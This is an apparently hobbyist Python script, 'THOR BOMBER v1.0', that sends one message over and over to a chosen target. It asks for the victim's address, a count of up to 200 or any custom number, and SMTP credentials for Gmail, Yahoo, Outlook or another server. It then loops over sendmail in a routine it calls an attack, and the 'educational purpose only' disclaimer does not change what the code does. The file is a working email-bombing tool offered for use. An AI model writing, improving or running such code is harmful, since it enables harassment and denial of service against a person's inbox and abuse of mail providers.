#made by Mohit-05 
#For for educational purpose only
#sub to w3w3w3



import sys
import smtplib
from colors import colors
import os
import time

def banner():
    os.system("clear")
    print("credits: w3w3w3 thanks ncorbuk <3")
    print(colors.BLUE + "THOR BOMBER v1.0")
    print(colors.BLUE + "For Educational Purpose only")
    print(colors.YELLOW + '''                                                          
                                                          
                                          ▒▒▓▓▓▓▒▒░░░░░░  
                                      ▒▒▒▒      ░░░░░░░░  
                              ░░████▒▒▓▓            ░░    
                              ██████▓▓██                  
                    ▓▓██████▓▓  ████▓▓██▒▒                
                ████████████    ██████████                
            ██████▓▓  ▒▒████  ██████████▓▓                
          ██████        ████████████████                  
        ██████    ▒▒██████████████████████                
      ██████    ██████████████████████████▒▒              
      ██████  ██████████████████████████████              —————————      ——
    ██████  ████████████████████████████████▒▒                |  |  | — |  |
    ██████████████████████████████████████████                |  |——|| ||——
    ██████████████████████████████████████████                |  |  | — | \\
    ██████████████████████████████████████████            
  ░░██████████████████████████████████████████            Author: Mohit-05
    ██████████████████████████████████████████            version: 1.0
    ██████████████████████████████████████████            
    ██████████████████████████████████████████            
      ██████████████████████████████████████              
      ██████████████████████████████████████              
        ██████████████████████████████████                
          ██████████████████████████████                  
            ▓▓████████████████████████                    
                ██████████████████                        
                        ░░                                
▓▓▒▒▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
''')


class email_bomber:
    count = 0

    def __init__(self):
        try:
            print(colors.GREEN + "\n[+]" + colors.PINK + " Initialising program")
            time.sleep(2)
            self.target = str(input(colors.GREEN + "[>] " + colors.CYAN + 'Enter Target Email: '))
            time.sleep(1)
            self.mode = int(input(colors.GREEN + "[>] " + colors.CYAN  + 'Enter Number of Message (1,2,3,4) \n 1: 200\n 2: 100\n 3: 50\n 4: custom\n' + colors.GREEN + '[>] '))
            time.sleep(1)
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print(colors.RED + "[-] Invalid Option")
                sys.exit(1)

        except KeyboardInterrupt:
            print(colors.RED + '[-] ' + colors.WHITE + 'Error: Keyboard Interrupt')
            sys.exit(1)

        except Exception as e:
            print(colors.RED + '[-] ' + colors.WHITE + f'[-] Error {e}')
            sys.exit(1)


    def bomb(self):
        try:
            print(colors.GREEN + "\n[+] " + colors.PINK + "Starting Bomber")
            time.sleep(2)
            self.amount = None
            if self.mode == int(1):
                self.amount = int(200)
            elif self.mode == int(2):
                self.amount = int(100)
            elif self.mode == int(3):
                self.amount = int(50)
            else:
                self.amount = int(input(colors.GREEN + "\n[>] " + colors.CYAN + "Enter the amount: "))


                print(colors.GREEN + "[+] " + colors.PINK + f'You have selected Bomb Mode: {self.mode} and {self.amount} emails')
            time.sleep(5)

        except KeyboardInterrupt:
            print(colors.RED + '[-] ' + colors.WHITE + 'Error: Keyboard Interrupt')
            sys.exit(1)

        except Exception as e:
            print(colors.RED + '[-] ' + colors.WHITE + f'[+] Error {e}')
            sys.exit(1)

    def email(self):
        try:
            self.server =str(input(colors.GREEN + '\n[>] ' + colors.CYAN + "Enter mail server | or choose one of the following \n 1. Gmail \n 2. Yahoo \n 3. Outlook\n" + colors.GREEN + '[>] '))
            time.sleep(1)
            premade = ['1', '2', '3']
            default_port = True 
            if self.server not in premade:
                default_port = False
                self.port = input(colors.GREEN + '\n[>] ' + colors.CYAN + 'Enter Port of your selected server: ')
                time.sleep(2)
               
            if default_port == True:
                self.port = int(587)

            if self.server == str(1):
                self.server = 'smtp.gmail.com'
            elif self.server == str(2):
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == str(3):
                self.server = 'smtp.mail.outlook.com'


            self.fromaddr = str(input(colors.GREEN + '\n[>] ' + colors.CYAN + "Enter from address: "))
            time.sleep(1)
            self.frompass = str(input(colors.GREEN + '\n[>] ' + colors.CYAN +  "Enter password: "))
            time.sleep(1)
            self.subject = str(input(colors.GREEN + '\n[>] ' + colors.CYAN +  "Enter subject: "))
            time.sleep(1)
            self.message = str(input(colors.GREEN + '\n[>] ' + colors.CYAN +  "Enter body of the message: "))
            time.sleep(1)



            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromaddr, self.target, self.subject, self.message)
          


            time.sleep(1)
            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromaddr, self.frompass)

        except KeyboardInterrupt:
            print(colors.RED + '[-] ' + colors.WHITE + 'Error: Keyboard Interrupt')
            sys.exit(1)

        except Exception as e:
            print(colors.RED + '[-] ' + colors.WHITE + f'[-] error: {e}')
            sys.exit(1)

    def send(self):
        try:
            self.s.sendmail(self.fromaddr, self.target, self.msg)
            self.count +=1
            print(colors.GREEN + '[+] ' + colors.YELLOW+  f'Message sent: {self.count}')

        except KeyboardInterrupt:
            print(colors.RED + '[-] ' + colors.WHITE + 'Error: Keyboard Interrupt')
            sys.exit(1)

        except Exception as e: 
            print(color.RED + '[-] ' + colors.WHITE + f'Error: {e}' )
            sys.exit(1)


    def attack(self):
        print(colors.GREEN + '\n[+] ' + colors.PINK + f'Attacking {self.target}')
        for email in range(self.amount):
            self.send()
        self.s.close()
        print(colors.GREEN + '\n[√] ' + colors.BLUE + 'Attack Finished')
        print(colors.GREEN + '[√] ' + colors.BLUE + 'Thanks For Using Thor Bomber' + colors.WHITE)
        print(colors.WHITE + '')
        sys.exit(0)




if __name__ == '__main__':
    banner()
    bomb = email_bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
    sys.exit(0)

    








